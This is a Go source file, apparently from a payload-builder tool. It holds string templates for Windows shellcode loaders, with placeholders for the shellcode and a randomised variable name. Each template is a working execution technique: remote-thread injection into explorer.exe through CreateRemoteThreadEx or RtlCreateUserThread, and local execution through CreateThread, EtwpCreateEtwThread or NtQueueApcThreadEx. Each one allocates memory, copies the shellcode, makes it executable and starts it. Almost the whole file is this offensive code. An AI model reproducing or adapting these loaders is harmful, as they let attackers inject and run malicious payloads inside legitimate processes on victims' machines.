package encode

var CreateRemoteThreadmain = []string{
	`processList, err := ps.Processes()
	if err != nil {
		return
	}
	var pid int
	for _, process := range processList {
		if process.Executable() == "explorer.exe" {
			pid = process.Pid()
			break
		}
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	pHandle, _ := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false,
		uint32(pid),
	)
	{{.suiji}}, _, _ := VirtualAllocEx.Call(
		uintptr(pHandle),
		0,
		uintptr(len({{.shellcode}})),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
	)
	fmt.Println("ok")
	_, _, _ = WriteProcessMemory.Call(
		uintptr(pHandle),
		{{.suiji}},
		(uintptr)(unsafe.Pointer(&{{.shellcode}}[0])),
		uintptr(len({{.shellcode}})),
	)
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirtualProtectEx.Call(
		uintptr(pHandle),
		{{.suiji}},
		uintptr(len({{.shellcode}})),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	_, _, _ = CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, {{.suiji}}, 0, 0, 0)
	_ = windows.CloseHandle(pHandle)`,
	``,
}

var CreateRemoteThreadvar = []string{
	``,
	`"unsafe"
      "fmt"
	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"`,
}

var RtlCreateUserThreadmain = []string{
	`processList, err := ps.Processes()
	if err != nil {
		return
	}
	var pid int
	for _, process := range processList {
		if process.Executable() == "explorer.exe" {
			pid = process.Pid()
			break
		}
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	CloseHandle := kernel32.NewProc("CloseHandle")
	pHandle, _, _ := OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		0, uintptr(uint32(pid)))
	{{.suiji}}, _, _ := VirtualAllocEx.Call(pHandle, 0, uintptr(len({{.shellcode}})),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	fmt.Println("ok")
	_, _, _ = WriteProcessMemory.Call(pHandle, {{.suiji}}, (uintptr)(unsafe.Pointer(&{{.shellcode}}[0])),
		uintptr(len({{.shellcode}})))
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirtualProtectEx.Call(pHandle, {{.suiji}}, uintptr(len({{.shellcode}})),
		windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	var tHandle uintptr
	_, _, _ = RtlCreateUserThread.Call(pHandle, 0, 0, 0, 0, 0, {{.suiji}}, 0,
		uintptr(unsafe.Pointer(&tHandle)), 0)
	_, _, _ = CloseHandle.Call(uintptr(uint32(pHandle)))`,
	``,
}

var RtlCreateUserThreadvar = []string{
	``,
	`"fmt"
	"unsafe"
	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"`,
}

var CreateThreadNativemain = []string{
	`kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	{{.suiji}}, _, _ := VirtualAlloc.Call(0, uintptr(len({{.shellcode}})),
		MemCommit|MemReserve, PageReadwrite)
	_, _, _ = RtlCopyMemory.Call({{.suiji}}, (uintptr)(unsafe.Pointer(&{{.shellcode}}[0])),
		uintptr(len({{.shellcode}})))
	oldProtect := PageReadwrite
	_, _, _ = VirtualProtect.Call({{.suiji}}, uintptr(len({{.shellcode}})), PageExecuteRead,
		uintptr(unsafe.Pointer(&oldProtect)))
	thread, _, _ := CreateThread.Call(0, 0, {{.suiji}}, uintptr(0), 0, 0)
	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)`,
	``,
}

var CreateThreadNativevar = []string{
	`const (
	MemCommit       = 0x1000
	MemReserve      = 0x2000
	PageExecuteRead = 0x20
	PageReadwrite   = 0x04
)`,
	`"unsafe"
	"golang.org/x/sys/windows"`,
}

var EtwpCreateEtwThreadmain = []string{
	`kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	EtwpCreateEtwThread := ntdll.NewProc("EtwpCreateEtwThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	{{.suiji}}, _, _ := VirtualAlloc.Call(0, uintptr(len({{.shellcode}})),
		MemCommit|MemReserve, PageReadwrite)
	_, _, _ = RtlCopyMemory.Call({{.suiji}}, (uintptr)(unsafe.Pointer(&{{.shellcode}}[0])),
		uintptr(len({{.shellcode}})))
	oldProtect := PageReadwrite
	_, _, _ = VirtualProtect.Call({{.suiji}}, uintptr(len({{.shellcode}})),
		PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
	thread, _, _ := EtwpCreateEtwThread.Call({{.suiji}}, uintptr(0))
	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)`,
	``,
}

var EtwpCreateEtwThreadvar = []string{
	`const (
	MemCommit       = 0x1000
	MemReserve      = 0x2000
	PageExecuteRead = 0x20
	PageReadwrite   = 0x04
)`,
	`"unsafe"
	"golang.org/x/sys/windows"`,
}

var CreateThreadmain = []string{
	`{{.suiji}}, _ := windows.VirtualAlloc(uintptr(0), uintptr(len({{.shellcode}})),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	_, _, _ = RtlCopyMemory.Call({{.suiji}}, (uintptr)(unsafe.Pointer(&{{.shellcode}}[0])), uintptr(len({{.shellcode}})))
	var oldProtect uint32
	_ = windows.VirtualProtect({{.suiji}}, uintptr(len({{.shellcode}})), windows.PAGE_EXECUTE_READ, &oldProtect)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")
	thread, _, _ := CreateThread.Call(0, 0, {{.suiji}}, uintptr(0), 0, 0)
	_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)`,
	``,
}

var CreateThreadvar = []string{
	``,
	`"unsafe"
	"golang.org/x/sys/windows"`,
}

var CreateRemoteThreadNativemain = []string{
	`processList, err := ps.Processes()
	if err != nil {
		return
	}
	var pid int
	for _, process := range processList {
		if process.Executable() == "explorer.exe" {
			pid = process.Pid()
			break
		}
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")
	pHandle, _, _ := OpenProcess.Call(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0,
		uintptr(uint32(pid)),
	)
	{{.suiji}}, _, _ := VirtualAllocEx.Call(pHandle, 0, uintptr(len({{.shellcode}})),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	fmt.Println("ok")
	_, _, _ = WriteProcessMemory.Call(pHandle, {{.suiji}}, (uintptr)(unsafe.Pointer(&{{.shellcode}}[0])),
		uintptr(len({{.shellcode}})))
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirtualProtectEx.Call(pHandle, {{.suiji}}, uintptr(len({{.shellcode}})),
		windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = CreateRemoteThreadEx.Call(pHandle, 0, 0, {{.suiji}}, 0, 0, 0)
	_, _, _ = CloseHandle.Call(uintptr(uint32(pHandle)))`,
	``,
}

var CreateRemoteThreadNativevar = []string{
	``,
	`"fmt"
	"unsafe"
	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"`,
}

var NtQueueApcThreadExmain = []string{
	`kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")
	{{.suiji}}, _, _ := VirtualAlloc.Call(0, uintptr(len({{.shellcode}})), MemCommit|MemReserve, PageReadwrite)
	fmt.Println("ok")
	_, _, _ = RtlCopyMemory.Call({{.suiji}}, (uintptr)(unsafe.Pointer(&{{.shellcode}}[0])), uintptr(len({{.shellcode}})))
	oldProtect := PageReadwrite
	_, _, _ = VirtualProtect.Call({{.suiji}}, uintptr(len({{.shellcode}})), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
	thread, _, _ := GetCurrentThread.Call()
	_, _, _ = NtQueueApcThreadEx.Call(thread, 1, {{.suiji}}, 0, 0, 0)`,
	``,
}

var NtQueueApcThreadExvar = []string{
	`const (
	MemCommit       = 0x1000
	MemReserve      = 0x2000
	PageExecuteRead = 0x20
	PageReadwrite   = 0x04
)`,
	`"fmt"
	"unsafe"
	"golang.org/x/sys/windows"
`,
}
